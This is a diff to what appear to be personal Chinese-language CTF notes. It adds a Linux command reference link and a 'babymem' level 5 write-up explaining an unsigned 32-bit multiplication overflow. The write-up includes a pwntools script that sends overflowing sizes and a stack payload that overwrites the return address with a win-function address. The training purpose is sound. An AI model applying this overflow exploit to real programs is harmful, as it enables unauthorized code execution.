@@ -154,7 +154,14 @@ while True:
 
 
 
-###
+### Linux 命令
+
+发现了一个很好的网站。有各种常用命令的讲解和使用案例。
+
+[https://linuxtools-rst.readthedocs.io/zh-cn/latest/base/index.html](https://linuxtools-rst.readthedocs.io/zh-cn/latest/base/index.html)
+
+### 符号表
+
 
 ### 
 
@@ -453,5 +460,32 @@ p.interactive()
 ```
 
 ## level 5
+
+这一关在输入的地方，已经限制为无符号整数无法溢出。
+
+但是在计算总大小的时候，两个32位的`usigned int`类型的整数相乘得到一个64位的整数。这个时候是可以溢出的。
+
+### 5.0
+
+```python
+from pwn import *
+elf = ELF("/challenge/babymem_level5.1")
+context.arch = 'amd64'
+
+p = process("/challenge/babymem_level5.1")
+p.sendline("65536")
+p.sendline("65536")
+
+buffer_size = 0x48
+win_func_address = p64(0x4018a4) # 地址查一下
+payload = buffer_size * b'A' + win_func_address
+
+p.sendline(payload)
+p.interactive()
+```
+
+## level 6
+
+## level 7
 
 
